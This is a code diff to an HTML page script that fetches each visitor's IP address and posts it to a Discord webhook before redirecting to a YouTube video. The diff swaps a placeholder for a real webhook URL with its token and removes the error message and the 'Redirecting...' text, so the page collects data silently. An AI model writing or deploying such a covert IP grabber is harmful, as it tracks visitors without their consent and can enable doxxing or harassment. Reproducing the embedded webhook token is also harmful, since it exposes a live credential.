@@ -11,7 +11,7 @@
         const ipData = await ipRes.json();
 
         // 2. Send to webhook
-        await fetch("https://your-webhook-url.com", {
+        await fetch("https://discord.com/api/webhooks/1359581999593033918/G0qtLtRlOeWNlgn1hekeqUPNVzdqd8hXTf80o8wq6YW0-yBp_Z7syBH0xNugNxmDD2j6", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ content: `IP: ${ipData.ip}` })
@@ -20,7 +20,7 @@
         // 3. Redirect to YouTube
         window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
       } catch (e) {
-        console.error("Failed to send IP or redirect:", e);
+
       }
     }
 
@@ -28,6 +28,6 @@
   </script>
 </head>
 <body>
-  <p>Redirecting...</p>
+  <p></p>
 </body>
 </html>
